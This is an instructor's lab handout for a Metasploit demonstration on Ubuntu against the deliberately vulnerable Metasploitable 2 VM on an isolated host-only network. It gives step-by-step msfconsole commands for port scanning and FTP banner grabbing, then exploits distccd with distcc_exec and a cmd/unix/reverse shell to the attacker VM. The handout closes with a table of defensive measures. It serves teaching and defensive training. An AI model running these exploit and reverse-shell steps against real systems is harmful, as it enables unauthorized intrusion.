Metasploit Framework Demonstration Lab on Ubuntu

Instructor-led demo45–60 minutesUbuntu 22.04 / 24.04

1. Demonstration Overview

Metasploit Framework is an open-source penetration testing platform used by cybersecurity professionals to discover, validate, and demonstrate security vulnerabilities.

This demonstration introduces Metasploit on Ubuntu, including installation, module discovery, port scanning, vulnerability identification, controlled exploitation, session management, and cleanup.

Demonstration objectives

  • Install Metasploit Framework on Ubuntu.
  • Navigate the Metasploit command-line interface (msfconsole).
  • Understand auxiliary, exploit, and payload modules.
  • Scan a target and identify network services.
  • Demonstrate exploitation against a deliberately vulnerable VM.
  • Explain a reverse shell and basic session management.
  • Interpret results and discuss defensive measures.

This is a non-gradable classroom demonstration, with no assignments or deliverables.

2. Demonstration Environment

We will use two virtual machines in an isolated lab environment.

MachineOperating systemPurpose
AttackerUbuntu DesktopRuns Metasploit
TargetMetasploitable 2Intentionally vulnerable Linux VM

The IP addresses in this lab are examples. Students should replace them with the actual addresses assigned to their VMs.

Network safety: Use VMware or VirtualBox with a dedicated host-only network. Do not bridge Metasploitable 2 directly to a campus or production LAN. A separate NAT adapter may be used temporarily on Ubuntu to download software, but the intentionally vulnerable target should remain isolated.

Rapid7 recommends purpose-built vulnerable virtual machines for exploitation exercises.

3. Part A — Install Metasploit on Ubuntu

Step 1. Update Ubuntu

Open Terminal:

sudo apt update
sudo apt upgrade -y

Step 2. Install prerequisites

sudo apt install curl wget git postgresql -y

Step 3. Download the official Metasploit installer script

cd ~
curl -fsSL \
  https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb \
  -o msfinstall

Step 4. Run the installer

chmod 755 msfinstall
sudo ./msfinstall

This installation method is documented by Rapid7. Review downloaded scripts before executing them.

Step 5. Verify the installation

msfconsole --version

Expected output resembles:

Framework Version: 6.x.x

The exact installed version may differ.

Step 6. Initialize the database

sudo msfdb init

If the database is already initialized, do not reinitialize it. Launch Metasploit:

msfconsole

Inside the console, check:

db_status

A successful connection typically reports that Metasploit is connected to PostgreSQL.

Instructor explanation: Metasploit can work without its database for many basic functions. PostgreSQL allows scan results, discovered hosts, and services to be organized in workspaces.

4. Part B — Learn the Metasploit Interface

After running msfconsole, the prompt will resemble:

msf6 >

Step 1. Display available commands

help

Step 2. View framework information

version

Step 3. Search for modules

search type:auxiliary scanner

Step 4. Understand the module categories

Module typeFunction

Instructor explanation: Metasploit separates vulnerabilities, exploitation techniques, and payloads into reusable components.

5. Part C — Prepare the Vulnerable Target

Step 1. Download and extract Metasploitable 2

Download the deliberately vulnerable Metasploitable 2 VM from the Metasploitable project page. Extract the downloaded ZIP archive into a dedicated directory. The extracted VMware image typically includes a .vmx configuration file and one or more .vmdk virtual disk files. Keep them together.

Step 2. Import the VM into VMware Workstation

  1. Open VMware Workstation on the host computer.
  2. Choose File → Open (or Open a Virtual Machine on the start screen).
  3. Browse to the extracted Metasploitable 2 folder, select Metasploitable.vmx (or the supplied .vmx file), and click Open. A preconfigured .vmx is normally opened, not imported through an OVF wizard.
  4. If prompted about moving or copying the virtual machine, choose I Copied It when using a newly extracted copy, so VMware assigns a new identifier.
  5. Before powering on, choose VM → Settings (or Edit virtual machine settings). Confirm the virtual hard disk is present.
  6. For Network Adapter, choose Host-only (a private network shared with the host). If using a second adapter for the demo, ensure that the adapter corresponding to eth1 is attached to the same host-only VMnet as Ubuntu; disconnect any unnecessary bridged adapter.
  7. In VMware Workstation, use Edit → Virtual Network Editor to verify the host-only VMnet and whether its VMware DHCP service is enabled. The DHCP service must be available if Metasploitable will acquire its host-only address via DHCP.
  8. Make sure the Ubuntu attack VM has a network adapter on that same host-only VMnet. Then power on Metasploitable 2.
If no .vmx file is supplied: Choose File → New Virtual Machine → Custom/Typical → I will install the operating system later, select an appropriate older Linux guest type (typically Ubuntu 32-bit or Other Linux 32-bit), and choose Use an existing virtual disk to attach the extracted .vmdk. Do not create a blank disk in place of the supplied virtual disk. Do not connect the intentionally vulnerable VM to a bridged or public network.

Step 3. Verify and enable the second host-only NIC (eth1)

Some Metasploitable 2 VMware configurations include a second NIC that is visible but not configured to start or request a DHCP address. At the Metasploitable 2 terminal, inspect the interfaces:

ip link show

Confirm which interface is connected to the host-only adapter; the following commands assume it is eth1. VMware adapter order and Linux interface naming can differ.

Edit the legacy Ubuntu network configuration:

sudo nano /etc/network/interfaces

Append these two lines without deleting the existing lo or eth0 settings:

auto eth1
iface eth1 inet dhcp

Save in Nano using Ctrl+O, Enter, then exit using Ctrl+X. Bring the adapter up and request an address:

sudo ifup eth1

Verify the link and, critically, the assigned IPv4 address:

ip link show
ip -4 addr show eth1
# Alternative on older Metasploitable images:
ifconfig eth1
Verification note: ip link show alone confirms link state, not whether DHCP assigned an IP address. Look for an inet address in ip -4 addr show eth1 or ifconfig eth1. If ip is unavailable on this legacy image, use ifconfig -a and ifconfig eth1. If ifup reports that the interface is already configured, inspect its current address before making further changes. If no IP is assigned, check VMware's DHCP setting for the host-only VMnet and whether the adapter is connected.

Step 4. Identify the target and attacker IP addresses

On Metasploitable, find the actual IPv4 address on the host-only interface (for illustration, 192.168.56.20):

ip -4 addr show eth1
# or: ifconfig eth1

On the Ubuntu attacker VM:

ip -4 addr

For illustration, Ubuntu has the address 192.168.56.10. Replace these example addresses in every later command with the IPs actually assigned to your VMs. If the VMware host-only DHCP server is disabled, either enable it or deliberately configure compatible static IP addresses on both VMs rather than relying on iface eth1 inet dhcp.

Step 5. Verify connectivity

From Ubuntu:

ping -c 4 192.168.56.20

If the target responds, the machines can communicate across the isolated host-only network. A failed ping does not always prove the target is unreachable.

Instructor explanation: A reachable host-only interface is necessary for scanning and for the reverse shell to call back to the Ubuntu listener. Take a snapshot of the VM before proceeding.

6. Part D — Scan the Target with Metasploit

Step 1. Start Metasploit

msfconsole

Step 2. Search for TCP scanning modules

search portscan

Step 3. Select the TCP scanner

use auxiliary/scanner/portscan/tcp

Step 4. Display configuration options

show options

Step 5. Configure the target

set RHOSTS 192.168.56.20
set PORTS 21,22,23,80,445,3632
set THREADS 5

Step 6. Execute the scan

run

Example output (illustrative):

[+] 192.168.56.20:21  - TCP OPEN
[+] 192.168.56.20:22  - TCP OPEN
[+] 192.168.56.20:23  - TCP OPEN
[+] 192.168.56.20:80  - TCP OPEN
[+] 192.168.56.20:445 - TCP OPEN
[+] 192.168.56.20:3632 - TCP OPEN

Actual results depend on the target's configuration.

Instructor explanation: The auxiliary TCP port scanner checks which network ports accept connections. It does not automatically exploit those services.

7. Part E — Service Identification

Step 1. Search for FTP scanner modules

search type:auxiliary ftp_version

Step 2. Select the FTP version scanner

use auxiliary/scanner/ftp/ftp_version

Step 3. Configure the target

set RHOSTS 192.168.56.20

Step 4. Run the scanner

run

An example banner from the original Metasploitable 2 image is:

220 (vsFTPd 2.3.4)

Instructor explanation: A service banner may reveal software and version information. This can help identify potentially vulnerable applications, but a banner alone does not prove that a vulnerability is exploitable.

8. Part F — Demonstrate Controlled Exploitation

In this section, we will use the deliberately vulnerable distccd service in Metasploitable 2.

Step 1. Identify the corresponding exploit module

search distcc

Step 2. Select the module

use exploit/unix/misc/distcc_exec

Step 3. Review module information

info

The output describes the vulnerability, references, targets, and payload support.

Step 4. Configure the target IP address

set RHOSTS 192.168.56.20

Step 5. Display available payloads

show payloads

Choose the supported Unix reverse shell payload:

set PAYLOAD cmd/unix/reverse

Step 6. Configure the listening address

set LHOST 192.168.56.10
set LPORT 4444

LHOST must be the Ubuntu host-only IP address reachable from the target, not 127.0.0.1. LPORT is the local listening TCP port (4444 is an example); ensure the Ubuntu firewall allows it inside the isolated lab. Unlike cmd/unix/reverse_bash, this generic command-shell reverse payload does not rely on Bash’s /dev/tcp feature. Confirm that show payloads lists this payload for your framework version.

Step 7. Inspect the final configuration

show options

Verify that the target, target port, payload, and listening interface are correct.

Step 8. Execute the exploit

run

When the original vulnerable service is present and the payload connection succeeds, Metasploit may report a newly opened command-shell session.

Rapid7 uses this exploit module and vulnerable VM as an example in its official documentation.

Instructor explanation: An exploit takes advantage of a vulnerability; the payload determines what happens after exploitation succeeds. For this demonstration, the reverse shell connects the target back to the instructor's Ubuntu VM.

9. Part G — Examine the Established Session

If a command shell opens, perform only minimal verification.

Step 1. Identify the current user

whoami

Step 2. Identify the system

uname -a

Step 3. Check the current directory

pwd

These commands demonstrate code execution on the target without modifying system files.

Step 4. Exit the session

exit

If you need to inspect sessions from Metasploit:

sessions -l

To close an active session by ID:

sessions -k 1

Replace 1 with the actual session ID.

Instructor explanation: A successful shell demonstrates that the vulnerable service allowed unauthorized command execution. In a security assessment, this is sufficient to establish the potential impact without attempting persistence, privilege escalation, or data extraction.

10. Part H — Understand Exploit vs. Payload

A useful concept to reinforce during the demonstration is that the exploit and payload have different roles.

For this example:

  • Vulnerability: The target exposes a vulnerable distccd service.
  • Exploit: exploit/unix/misc/distcc_exec attempts remote command execution.
  • Payload: cmd/unix/reverse attempts to establish a reverse command shell.

A successful exploit does not always guarantee that a payload will execute successfully.

11. Part I — Demonstrate Defensive Measures

Following the demonstration, discuss how these issues can be prevented.

Security issueDefensive measure
Outdated vulnerable softwareApply security patches and updates
Unnecessary network servicesDisable services that are not required
Exposed remote administrationRestrict access with firewalls and segmentation
Excessive service privilegesRun network services with least privilege
Unauthorized remote executionUse monitoring, logging, and intrusion detection
Weak network isolationSeparate test, user, and production networks

The primary lesson is that discovering an open port is not the same as establishing vulnerability. Vulnerability validation and controlled exploitation help assess actual security risk.

12. Part J — Cleanup

Step 1. Exit any active shells

exit

Step 2. List remaining Metasploit sessions

sessions -l

Close any session still active:

sessions -k <SESSION_ID>

Step 3. Exit Metasploit

exit

Step 4. Shut down Metasploitable

Power off the vulnerable VM after the demonstration. Keep it disconnected from public and production networks.

If you created clean VM snapshots before the exercise, revert to them as appropriate.
